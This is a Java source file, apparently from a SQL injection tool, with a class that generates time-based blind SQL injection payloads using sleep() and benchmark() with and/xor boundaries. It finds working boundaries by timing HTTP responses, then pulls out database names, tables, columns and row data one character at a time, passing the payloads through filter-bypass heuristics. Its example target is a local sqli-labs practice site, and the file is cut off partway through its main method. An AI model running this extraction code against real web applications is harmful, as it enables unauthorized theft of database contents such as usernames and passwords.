package com.sqldd.payloadOrigin;

import com.sqldd.crawler.HtmlDownloader;
import com.sqldd.crawler.MyRequestSet;
import com.sqldd.fuzzingWaf.PageComparison;
import com.sqldd.payloadOrigin.utils.HeuristicUtils;
import com.sqldd.payloadOrigin.utils.OpBoundary;
import com.sqldd.payloadOrigin.utils.Tools;
import org.springframework.util.DigestUtils;

import java.util.ArrayList;
import java.util.HashMap;

public class TimeBlindPayloads {
    private String url;
    private String method;
    private String pre;
    private String preWrong;
    private String suf;
    private String sufbk;
    private HashMap<String, String> params = new HashMap<String, String>();//参数
    private String injectingKey;//正在测试的注入点
    private HashMap<String,String> normalparams1;//两个正常值，用于定位正常/异常/WAF网页
    private HashMap<String,String> normalparams2;//两个正常值，用于定位正常/异常/WAF网页
    private HtmlDownloader htmlDownloader = new HtmlDownloader(new MyRequestSet());
    private HeuristicUtils heuristicUtils = new HeuristicUtils();
    private String chars = "qwertyuiopasdfghklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890_-~@&()";
    private OpBoundary opBoundary = new OpBoundary();
    private Tools tools = new Tools();

    //有参构造
    public TimeBlindPayloads(String url, String method,String pre, String preWrong, String suf, String sufbk, HashMap<String, String> params, String injectingKey, HashMap<String,String> normalparams1,HashMap<String,String> normalparams2) {
        this.url = url;
        this.method = method;
        this.pre = pre;
        this.preWrong = preWrong;
        this.suf = suf;
        this.sufbk = sufbk;
        this.params = params;
        this.injectingKey = injectingKey;
        this.normalparams1 = normalparams1;
        this.normalparams2 = normalparams2;
    }

    /**
     * s += "substring,substr,mid,left,right,replace,lpad";//字符串截取函数,前三可返回单字符，left和right可组合返回单字符,replace和lpad可组合
     * s += "ascii,ord,conv,hex";//返回字符ascii码,conv和hex组合
     * s += "if,";//判断选择函数
     * s += "sleep,benchmark,";//时间盲注,笛卡尔积
     * s += "if,case,when,then,else,end,";//case,when,then,else,end一起使用
     */
    private final ArrayList<Integer> asciiNum = new ArrayList<>();
    {
        for (int i = 32; i < 127; i++) {
            asciiNum.add(i);
        }
    }

    //公共部分提取出来，避免重复调用浪费时间
    public ArrayList<String> getNormalRst() throws InterruptedException {
        System.out.println("获取正常页面值");
        //正常页面
        PageComparison pageComparison = new PageComparison(this.url,this.method);
        ArrayList<String> normalRst = pageComparison.getNormalPageComparison(normalparams1, normalparams2);
        return normalRst;
    }

    //子字符串选择
    public HashMap<Integer, String> subStrFuncChoise() {
        HashMap<Integer, String> substrs = new HashMap<>();
        substrs.put(1, "substring([],[],1)");
        /*substrs.put(2,"substr([],[],1)");
        substrs.put(3,"mid([],[],1)");
        // ,号过滤时也可以用mid(database() from 1 for 1);
        substrs.put(4,"substring([] from [] for 1");
        substrs.put(5,"substr([] from [] for 1");
        substrs.put(6,"substr([] from [] for 1");
        substrs.put(7,"right(left([],[]),1)");
        substrs.put(8,"right(lpad([],[],1),1)");
        substrs.put(9,"right(rpad([],[],1),1)");
        */
        return substrs;
    }

    //ascii码函数选择
    public HashMap<Integer, String> asciiFuncChoise(String inlineStr) {
        HashMap<Integer, String> asciifuncs = new HashMap<>();
        asciifuncs.put(1, "ascii" + "(" + inlineStr + ")");
        /*asciifuncs.put(2,"ord" + "(" + inlineStr + ")");
        asciifuncs.put(3,"conv(hex("+inlineStr+"),16,10)");
        */
        return asciifuncs;
    }

    //判断语句选择 if/case
    public HashMap<Integer, String> judgeFuncChoise(boolean ifdoWhatfirstBit, String inlineStr, String comparisonChar, String comparisonRst, String doWhat) {
        HashMap<Integer, String> judgeCases = new HashMap<>();
        if (ifdoWhatfirstBit) {//<dowhat,1>还是<1,dowhat>
            judgeCases.put(1, "if(" + inlineStr + " " + comparisonChar + " " + comparisonRst + "," + doWhat + ",1)");// if([query]=1,sleep(3),1)
            //judgeCases.put(2,"case when "+inlineStr +" "+comparisonChar+" "+comparisonRst+" then "+doWhat+" else 1 end");//case when 'a'=113 then sleep else 1 end;
        } else {
            judgeCases.put(1, "if(" + inlineStr + " " + comparisonChar + " " + comparisonRst + ",1," + doWhat + ")");// if([query]=1,1,sleep(3))
            //judgeCases.put(2,"case when "+inlineStr +" "+comparisonChar+" "+comparisonRst+" then 1 else "+doWhat+" end");//case when 'a'=113 then 1 else dowhat end;
        }
        return judgeCases;
    }

    //延时语句选择
    public HashMap<Integer, String> doWhat() {
        HashMap<Integer, String> dowhats = new HashMap<>();
        dowhats.put(1, "sleep(3)");
        dowhats.put(2, "benchmark(10000000,sha(1))");
        /*//1秒
        dowhats.put(3,"concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd'");
        //两秒
        dowhats.put(4,"concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddasdasdasdasdasdasdasdasdasdasdasdadasdasdasdasdasdasdasdasdasdasdasd'");
        //无效
        dowhats.put(5,"rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b')");
        //0.7秒
        dowhats.put(6,"(SELECT count(*) FROM information_schema.columns A, information_schema.columns B)");
        */
        return dowhats;
    }

    //构造所有boundary
    public ArrayList<String[]> makeBoundarys(String symble) {
        ArrayList<String[]> allBoundarys = new ArrayList<>();
        HashMap<Integer, String> doWhats = doWhat();
        ArrayList<String> symbles = new ArrayList<String>() {
            {
                add("=");
                add(">");
                add("<");
                add("-");
                add("regexp");
                add("like");
                add("rlike");
            }
        };

        if (symble.equals("=") || symble.equals(">") || symble.equals("<") || symble.equals("-")) {
            HashMap<Integer, String> substrs = subStrFuncChoise();
            for (Integer key : substrs.keySet()) {
                String substr = substrs.get(key);//substring([],[],1)
                HashMap<Integer, String> asciis = asciiFuncChoise(substr);
                for (Integer key2 : asciis.keySet()) {
                    String asciistr = asciis.get(key2);
                    for (Integer key3 : doWhats.keySet()) {
                        if (symble.equals("=")) {
                            HashMap<Integer, String> judgestrs = judgeFuncChoise(true, asciistr, "=", "[]", doWhats.get(key3));
                            for (Integer key4 : judgestrs.keySet()) {
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + suf});//1' and if(ascii(substring([],[],1))=[],sleep(1),1)-- ;
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + " and " + sufbk + "1"});//1' and if(ascii(substring([],[],1))=[],sleep(1),1) and '1;
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + suf});//1' and if(ascii(substring([],[],1))=[],sleep(1),1) and '1;
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + " and " + sufbk + "1"});
                            }
                        } else if (symble.equals(">")) {//if(ascii(substring([],[],1))>[],1,sleep(1));
                            HashMap<Integer, String> judgestrs = judgeFuncChoise(false, asciistr, ">", "[]", doWhats.get(key3));
                            for (Integer key4 : judgestrs.keySet()) {
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + " and " + sufbk + "1"});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + " and " + sufbk + "1"});
                            }
                        } else if (symble.equals("-")) {//if(ascii(substring([],[],1))-115,1,sleep(1));
                            HashMap<Integer, String> judgestrs = judgeFuncChoise(false, asciistr, "-", "[]", doWhats.get(key3));
                            for (Integer key4 : judgestrs.keySet()) {
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + " and " + sufbk + "1"});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + " and " + sufbk + "1"});
                            }
                        } else if (symble.equals("<")) {//if(ascii(substring([],[],1))<[],sleep(1),1);
                            HashMap<Integer, String> judgestrs = judgeFuncChoise(true, asciistr, "<", "[]", doWhats.get(key3));
                            for (Integer key4 : judgestrs.keySet()) {
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key4) + " and " + sufbk + "1"});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + suf});
                                allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key4) + " and " + sufbk + "1"});
                            }
                        }
                    }
                }
            }
        } else if (symble.equals("regexp") || symble.equals("like") || symble.equals("rlike")) {
            for (Integer key : doWhats.keySet()) {
                if (symble.equals("regexp")) {//if([] regexp '^[]',sleep(1),1);
                    HashMap<Integer, String> judgestrs = judgeFuncChoise(true, "[]", "regexp", "'^[]'", doWhats.get(key));
                    for (Integer key1 : judgestrs.keySet()) {
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + " and " + sufbk + "1"});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + " and " + sufbk + "1"});
                    }
                } else if (symble.equals("like")) {//if(database() like '[security]%',sleep(1),1);
                    HashMap<Integer, String> judgestrs = judgeFuncChoise(true, "[]", "like", "'[]%'", doWhats.get(key));
                    for (Integer key1 : judgestrs.keySet()) {
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + " and " + sufbk + "1"});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + " and " + sufbk + "1"});
                    }
                } else if (symble.equals("rlike")) {//if(database() rlike '^[security]',sleep(1),1);
                    HashMap<Integer, String> judgestrs = judgeFuncChoise(true, "[]", "rlike", "'^[]'", doWhats.get(key));
                    for (Integer key1 : judgestrs.keySet()) {
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " and " + judgestrs.get(key1) + " and " + sufbk + "1"});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + suf});
                        allBoundarys.add(new String[]{symble, pre + " xor " + judgestrs.get(key1) + " and " + sufbk + "1"});
                    }
                }
            }
        }
        return allBoundarys;
    }
    //筛选出所有有效的boundary
    public boolean filterBoundarys() {
        Tools tools = new Tools();
        ArrayList<String> symbles = new ArrayList<>();
        ArrayList<String> boundarysUserful = new ArrayList<>();
        symbles.add("=");
        symbles.add(">");
        symbles.add("<");
        symbles.add("-");
        symbles.add("regexp");
        symbles.add("like");
        symbles.add("rlike");
        for (String symble : symbles) {
            //if(substring([],[],1) = [],sleep(3),1)
            ArrayList<String[]> payloadsBoundarys = makeBoundarys(symble);
            for (String[] boundary : payloadsBoundarys) {
                if (symble.equals("=") || symble.equals(">") || symble.equals("<") || symble.equals("-")) {
                    String tihuan = tools.tihuan(boundary[1], "'s'");
                    String tihuan1 = tools.tihuan(tihuan, "1");
                    String tihuan2 = tools.tihuan(tihuan1, "115");
                    String heuristicDetection = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", tihuan2, "");
                    if (heuristicDetection != null) {
                        boolean b = triggerDelay(heuristicDetection);
                        if (b) {
                            System.out.println("[FOUND userful boundary]:" + boundary[1]);
                            boundarysUserful.add(boundary[0] + ":" + boundary[1]);
                        }
                    }
                } else if (symble.equals("regexp") || symble.equals("like") || symble.equals("rlike")) {
                    String tihuan = tools.tihuan(boundary[1], "1");//if([1] regexp '^[1]'...)
                    String tihuan1 = tools.tihuan(tihuan, "1");
                    String heuristicDetection = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", tihuan1, "");
                    if (heuristicDetection != null) {
                        boolean b = triggerDelay(heuristicDetection);
                        if (b) {
                            System.out.println("[FOUND userful boundary]:" + boundary[1]);
                            boundarysUserful.add(boundary[0] + ":" + boundary[1]);
                        }
                    }
                }
            }
        }
        if(boundarysUserful != null){
            String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
            opBoundary.storeBoundaryInTxt("time",urlMd5, boundarysUserful);
            return true;
        }
        return false;
    }
    //payload延时测试
    public boolean triggerDelay(String payload) {
        params.put(injectingKey, payload);
        //起始时间
        long startTime = System.currentTimeMillis();
        //访问网页
        if(method.equals("get"))
            htmlDownloader.downloadHtmlWithParamsGet(url, params);
        else if(method.equals("post"))
            htmlDownloader.downloadHtmlWithParamsPost(url, params);
        //结束时间
        long endTime = System.currentTimeMillis(); //获取结束时间
        //System.out.println("访问用时： " + (endTime - startTime) + "ms");
        if (endTime - startTime > 1800)
            return true;
        return false;
    }

    //获取数据库
    public String getDatabasePerBoundar(String comparisonChar, String boundary) {
        String StrRsts = "";
        String query = "(select database())";
        String addQuery = tools.tihuan(boundary, query);
        String addQueryHeurist = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", addQuery, "");
        if (addQueryHeurist == null)//无法绕过返回null
            return null;
        if (comparisonChar.equals("=") || comparisonChar.equals(">") || comparisonChar.equals("<") || comparisonChar.equals("-")) {
            for (int i = 1; i < 22; i++) {//假定当前数据库长度小于22
                int j = 32;
                while (j++ < 127) {
                    String addI = tools.tihuan(addQueryHeurist, "" + i);
                    String addJ = tools.tihuan(addI, "" + j);
                    if (triggerDelay(addJ)) {
                        System.out.println("[FOUND]:" + (char) j);
                        StrRsts += (char) j;
                        break;
                    }
                }
                if (j == 128)//当前字符都存在，则表明长度超出-返回结果
                    break;
            }
        } else if (comparisonChar.equals("regexp") || comparisonChar.equals("like") || comparisonChar.equals("rlike")) {
            for (int i = 1; i < 22; i++) {
                int i1 = 0;
                while (i1 < chars.length()) {
                    String addJ = tools.tihuan(addQueryHeurist, StrRsts + chars.charAt(i1));
                    if (triggerDelay(addJ)) {
                        System.out.println("[FOUND]:" + chars.charAt(i1));
                        StrRsts += chars.charAt(i1);
                        break;
                    }
                    i1++;
                }
                if (i1 == chars.length())
                    break;
            }
        }
        return StrRsts;
    }
    public String getDatabaseAllIn() {
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> boundarys = opBoundary.getBoundarysFromTxt("time",urlMd5);
        ArrayList<String[]> boundarysSplit = new ArrayList<>();
        for (String boundary : boundarys) {
            String[] split = boundary.split(":");
            boundarysSplit.add(new String[]{split[0], split[1]});
        }
        for (String[] boundary : boundarysSplit) {
            String databasePer = getDatabasePerBoundar(boundary[0], boundary[1]);
            if (databasePer != null)
                return databasePer;
        }
        return null;
    }
    //获取所有数据库
    public ArrayList<String> getAllDatabasePerBoundary(String comparisonChar, String boundary){
        ArrayList<String> alldbs = new ArrayList<>();
        String query = "(select schema_name from information_schema.schemata limit [],1)";
        String addQuery = tools.tihuan(boundary, query);
        String addQueryHeurist = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", addQuery, "");
        if (addQueryHeurist == null)//无法绕过返回null
            return null;
        for (int dbNumIndex = 0; dbNumIndex < 10; dbNumIndex++) {//假设不超过10个数据库
            String nowDBRsts = "";
            String adddbNumIndex = tools.tihuan(addQueryHeurist, "" + dbNumIndex);
            if (comparisonChar.equals("=") || comparisonChar.equals(">") || comparisonChar.equals("<") || comparisonChar.equals("-")) {
                for (int dbLenIndex = 1; dbLenIndex < 22; dbLenIndex++) {//假定当前数据库长度小于22
                    int j = 32;
                    while (j++ < 127) {
                        String adddbLenIndex = tools.tihuan(adddbNumIndex, "" + dbLenIndex);
                        String addJ = tools.tihuan(adddbLenIndex, "" + j);
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + (char) j);
                            nowDBRsts += (char) j;
                            break;
                        }
                    }
                    if (j == 128)//当前字符都存在，则表明长度超出-返回结果
                        break;
                }
            } else if (comparisonChar.equals("regexp") || comparisonChar.equals("like") || comparisonChar.equals("rlike")) {
                for (int dbLenIndex = 1; dbLenIndex < 22; dbLenIndex++) {
                    int i1 = 0;
                    while (i1 < chars.length()) {
                        String addJ = tools.tihuan(addQueryHeurist, nowDBRsts + chars.charAt(i1));
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + chars.charAt(i1));
                            nowDBRsts += chars.charAt(i1);
                            break;
                        }
                        i1++;
                    }
                    if (i1 == chars.length())
                        break;
                }
            }
            System.out.println("[FOUND database]"+nowDBRsts);
            alldbs.add(nowDBRsts);
        }
        return alldbs;
    }
    public ArrayList<String> getAllDBAllIn() {
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> boundarys = opBoundary.getBoundarysFromTxt("time",urlMd5);
        ArrayList<String[]> boundarysSplit = new ArrayList<>();
        for (String boundary : boundarys) {
            String[] split = boundary.split(":");
            boundarysSplit.add(new String[]{split[0], split[1]});
        }
        for (String[] boundary : boundarysSplit) {
            ArrayList<String> allDBS = getAllDatabasePerBoundary(boundary[0], boundary[1]);
            if (allDBS != null)
                return allDBS;
        }
        return null;
    }
    //获取某个数据库的表
    public ArrayList<String> getTablePerBoundary(String comparisonChar, String boundary, String database) {
        ArrayList<String> tables = new ArrayList<>();
        String query = "(select table_name from information_schema.tables where table_schema='"+database+"' limit [],1)";
        String addQuery = tools.tihuan(boundary, query);
        String addQueryHeurist = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", addQuery, "");
        if (addQueryHeurist == null)//无法绕过返回null
            return null;
        if (comparisonChar.equals("=") || comparisonChar.equals(">") || comparisonChar.equals("<") || comparisonChar.equals("-")) {
            for (int tableIndex = 0; tableIndex < 12; tableIndex++) {//假定表的数量小于12
                String addtableIndex = tools.tihuan(addQueryHeurist, "" + tableIndex);
                String tableIndex_rst = "";
                for (int i = 1; i < 22; i++) {//假定当前表名长度小于22
                    int j = 32;
                    while (j++ < 127) {
                        String addI = tools.tihuan(addtableIndex, "" + i);
                        String addJ = tools.tihuan(addI, "" + j);
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + (char) j);
                            tableIndex_rst += (char) j;
                            break;
                        }
                    }
                    if (j == 128)//当前字符都存在，则表明长度超出-返回结果
                        break;
                }
                System.out.println("[FOUND table]"+tableIndex_rst);
                tables.add(tableIndex_rst);
            }
        } else if (comparisonChar.equals("regexp") || comparisonChar.equals("like") || comparisonChar.equals("rlike")) {
            for (int tableIndex = 0; tableIndex < 12; tableIndex++) {//假定表的数量小于12
                String addtableIndex = tools.tihuan(addQueryHeurist, "" + tableIndex);
                String tableIndex_rst = "";
                for (int i = 1; i < 22; i++) {
                    int i1 = 0;
                    while (i1 < chars.length()) {
                        String addJ = tools.tihuan(addtableIndex, tableIndex_rst + chars.charAt(i1));
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + chars.charAt(i1));
                            tableIndex_rst += chars.charAt(i1);
                            break;
                        }
                        i1++;
                    }
                    if (i1 == chars.length())
                        break;
                }
                tables.add(tableIndex_rst);
            }
        }
        return tables;
    }
    public ArrayList<String> getTablesALlIn(String database){
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> boundarys = opBoundary.getBoundarysFromTxt("time",urlMd5);
        ArrayList<String[]> boundarysSplit = new ArrayList<>();
        for (String boundary : boundarys) {
            String[] split = boundary.split(":");
            boundarysSplit.add(new String[]{split[0], split[1]});
        }
        for (String[] boundary : boundarysSplit) {
            System.out.println("getTablesALlIn->测试新的boundary-"+boundary[1]);
            ArrayList<String> tables = getTablePerBoundary(boundary[0], boundary[1], database);
            if(tables != null)
                return tables;
            System.out.println(boundary[1] + "-无效!");
        }
        return null;
    }
    //获取某个数据库下的表的列
    public ArrayList<String> getColumnPerBoundary(String comparisonChar,String boundary,String database,String tablename){
        ArrayList<String> columns = new ArrayList<>();
        String query = "(select column_name from information_schema.columns where table_schema='[]' and table_name='[]' limit [],1)";
        String addQuery = tools.tihuan(boundary, query);
        String addDatabase = tools.tihuan(addQuery, database);
        String addTablename = tools.tihuan(addDatabase, tablename);
        String addQueryHeurist = heuristicUtils.heuristicDetection(url,method, params, injectingKey, normalparams1,normalparams2, "", addTablename, "");
        if (addQueryHeurist == null)//无法绕过返回null
            return null;
        if (comparisonChar.equals("=") || comparisonChar.equals(">") || comparisonChar.equals("<") || comparisonChar.equals("-")) {
            for (int columnIndex = 0; columnIndex < 12; columnIndex++) {//假定字段的数量小于12
                String addcolumnIndex = tools.tihuan(addQueryHeurist, "" + columnIndex);
                String tableIndex_rst = "";
                for (int i = 1; i < 22; i++) {//假定当前字段长度小于22
                    int j = 32;
                    while (j++ < 127) {
                        String addI = tools.tihuan(addcolumnIndex, "" + i);
                        String addJ = tools.tihuan(addI, "" + j);
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + (char) j);
                            tableIndex_rst += (char) j;
                            break;
                        }
                    }
                    if (j == 128)//当前字符都存在，则表明长度超出-返回结果
                        break;
                }
                columns.add(tableIndex_rst);
            }
        }else if (comparisonChar.equals("regexp") || comparisonChar.equals("like") || comparisonChar.equals("rlike")) {
            for (int columnIndex = 0; columnIndex < 12; columnIndex++) {//假定表的数量小于12
                String addcolumnIndex = tools.tihuan(addQueryHeurist, "" + columnIndex);
                String tableIndex_rst = "";
                for (int i = 1; i < 22; i++) {
                    int i1 = 0;
                    while (i1 < chars.length()) {
                        String addJ = tools.tihuan(addcolumnIndex, tableIndex_rst + chars.charAt(i1));
                        if (triggerDelay(addJ)) {
                            System.out.println("[FOUND]:" + chars.charAt(i1));
                            tableIndex_rst += chars.charAt(i1);
                            break;
                        }
                        i1++;
                    }
                    if (i1 == chars.length())
                        break;
                }
                columns.add(tableIndex_rst);
            }
        }
        return columns;
    }
    public ArrayList<String> getColumnAllIn(String database,String tablename){
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> boundarys = opBoundary.getBoundarysFromTxt("time",urlMd5);
        ArrayList<String[]> boundarysSplit = new ArrayList<>();
        for (String boundary : boundarys) {
            String[] split = boundary.split(":");
            boundarysSplit.add(new String[]{split[0], split[1]});
        }
        for (String[] boundary : boundarysSplit) {
            System.out.println("getColumnAllIn->测试新的boundary-"+boundary[1]);
            ArrayList<String> columns = getColumnPerBoundary(boundary[0], boundary[1], database, tablename);
            if(columns != null)
                return columns;
            System.out.println(boundary[1] + "-无效!");
        }
        return null;
    }
    //获取某个数据库下的表的列的值
    public ArrayList<ArrayList<String>> getDataPerBoundary(String comparisonChar,String boundary,String database,String tablename,ArrayList<String> columnname){
        ArrayList<ArrayList<String>> datas = new ArrayList<>();
        String query = "(select [] from [].[] order by [] limit [],1)";//id,security,users,id
        for (String colname : columnname) {//id username password
            ArrayList<String> rstPercolumn = new ArrayList<>();
            rstPercolumn.add("=="+colname+"==");
            String addQuery = tools.tihuan(boundary, query);
            String addColumnname = tools.tihuan(addQuery, colname);
            String addDatabase = tools.tihuan(addColumnname, database);
            String addTablename = tools.tihuan(addDatabase, tablename);
            String addOrderbyNum = tools.tihuan(addTablename, columnname.get(0));
            String addQueryHeurist = heuristicUtils.heuristicDetection(url, method,params, injectingKey, normalparams1,normalparams2, "", addOrderbyNum, "");
            if (addQueryHeurist == null)//无法绕过返回null
                return datas;
            if (comparisonChar.equals("=") || comparisonChar.equals(">") || comparisonChar.equals("<") || comparisonChar.equals("-")) {
                for (int columnNumIndex = 0; columnNumIndex < 12; columnNumIndex++) {//假定当前列数据小于12
                    String addcolumnNumIndex = tools.tihuan(addQueryHeurist, "" + columnNumIndex);
                    String colIndexData_rst = "";
                    for (int i = 1; i < 22; i++) {//假定当前数据长度小于22
                        int j = 32;
                        while (j++ < 127) {
                            String addI = tools.tihuan(addcolumnNumIndex, "" + i);
                            String addJ = tools.tihuan(addI, "" + j);
                            if (triggerDelay(addJ)) {
                                System.out.println("[FOUND]:" + (char) j);
                                colIndexData_rst += (char) j;
                                break;
                            }
                        }
                        if (j == 128)//当前字符都存在，则表明长度超出-返回结果
                            break;
                    }
                    rstPercolumn.add(colIndexData_rst);
                }
                datas.add(rstPercolumn);
            }else if (comparisonChar.equals("regexp") || comparisonChar.equals("like") || comparisonChar.equals("rlike")) {
                for (int columnNumIndex = 0; columnNumIndex < 12; columnNumIndex++) {
                    String addcolumnNumIndex = tools.tihuan(addQueryHeurist, "" + columnNumIndex);
                    String colIndexData_rst = "";
                    for (int i = 1; i < 22; i++) {
                        int i1 = 0;
                        while (i1 < chars.length()) {
                            String addJ = tools.tihuan(addcolumnNumIndex, colIndexData_rst + chars.charAt(i1));
                            if (triggerDelay(addJ)) {
                                System.out.println("[FOUND]:" + chars.charAt(i1));
                                colIndexData_rst += chars.charAt(i1);
                                break;
                            }
                            i1++;
                        }
                        if (i1 == chars.length())
                            break;
                    }
                    rstPercolumn.add(colIndexData_rst);
                }
            }
            datas.add(rstPercolumn);
        }

        return datas;
    }
    public ArrayList<ArrayList<String>> getDataAllIn(String database,String tablename,ArrayList<String> columnname){
        String urlMd5 = DigestUtils.md5DigestAsHex(url.getBytes());
        ArrayList<String> boundarys = opBoundary.getBoundarysFromTxt("time",urlMd5);
        ArrayList<String[]> boundarysSplit = new ArrayList<>();
        for (String boundary : boundarys) {
            String[] split = boundary.split(":");
            boundarysSplit.add(new String[]{split[0], split[1]});
        }
        for (String[] boundary : boundarysSplit) {
            System.out.println("getDataAllIn->测试新的boundary-"+boundary[1]);
            ArrayList<ArrayList<String>> datas = getDataPerBoundary(boundary[0], boundary[1], database, tablename, columnname);
            if(datas != null)
                return datas;
            System.out.println(boundary[1] + "-无效!");
        }
        return null;
    }

    public HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> getCurrentDBsDatas(){
        String database = getDatabaseAllIn();
        if(database != null){
            System.out.println("[进程success]：获取当前数据库:[" + database + "]");
            ArrayList<String> tables = getTablesALlIn(database);
            if(tables != null){
                System.out.print("[进程success]：获取数据库["+database+"]的表:[");
                for (String table : tables) {
                    System.out.print(table+" ");
                }
                System.out.print("]\n");
                for (String table : tables) {
                    ArrayList<String> columns = getColumnAllIn(database, table);
                    if(columns != null){
                        System.out.print("[进程success]：获取数据库["+database+"]的表["+table+"]的列:[");
                        for (String columnName : columns) {
                            System.out.print(columnName+" ");
                        }
                        System.out.print("]\n");
                        ArrayList<ArrayList<String>> datas = getDataAllIn(database, table, columns);
                        if(datas != null){
                            for (ArrayList<String> data : datas) {
                                for (String datum : data) {
                                    System.out.println(datum);
                                }
                            }
                        }else
                            System.out.println("[进程fail]：获取数据库["+database+"]的表["+table+"]的列的值");
                    }else
                        System.out.println("[进程fail]：获取数据库["+database+"]的表["+table+"]的列");
                }
            }else
                System.out.println("[进程fail]：获取数据库["+database+"]的表");
        }else
            System.out.println("[进程fail]：获取当前数据库");

        return null;
    }

    public static void main(String[] args) {
        //select 1 and if(ascii(substr(select user()),1,2) > 12,sleep,null);
/*        String url = "http://localhost/sqli-labs/Less-1/";
        String method = "get";
        String pre = "1'";
        String preWrong = "-1'";
        String suf = "-- ";
        String sufbk = "'";
        HashMap<String, String> params = new HashMap<>();
        params.put("id", "anys");
        String injectingKey = "id";
        String [] normalvalue = {"1","2"};

        TimeBlindPayloads test = new TimeBlindPayloads(url,method, pre, preWrong, suf, sufbk, params, injectingKey, normalvalue);*/

        /*String database = test.getDatabaseAllIn();
        System.out.println(database);//security*/


        /*ArrayList<String> columns = test.getColumnAllIn("security", "users");
        for (String column : columns) {
            System.out.println(column);
        }
        */
        /*ArrayList<String> columnname = new ArrayList<String>(){
            {
                add("id");
                add("username");
                add("password");
            }
        };
        ArrayList<ArrayList<String>> datas = test.getDataAllIn("security", "users", columnname);*/
        /*String db = test.getDatabaseAllIn();
        System.out.println(db);
        ArrayList<String> allIn = test.getAllDBAllIn();
        for (String s : allIn) {
            System.out.println(s);
        }*/
        /*HashMap<String, HashMap<String, ArrayList<ArrayList<String>>>> currentDBsDatas = test.getCurrentDBsDatas();*/
        String url = "http://localhost/sqli-labs/Less-12/";
        String method = "post";
        HashMap<String, String> params = new HashMap<>();
        params.put("uname", "admin");
        params.put("passwd", "admin");
        params.put("submit", "Submit");
        String injectingKey ="uname";
        HashMap<String, String> normalparams1 = new HashMap<String,String>(){
            {
                put("uname", "admin1");
                put("passwd", "admin1");
                put("submit", "Submit");
            }
        };
        HashMap<String, String> normalparams2 = new HashMap<String,String>(){
            {
                put("uname", "admin2");
                put("passwd", "admin2");
                put("submit", "Submit");
            }
        };
        String pre = "admin\")";
        String preWrong = "xx\")";
        String suf = "-- ";
        String sufbk = "(\"";
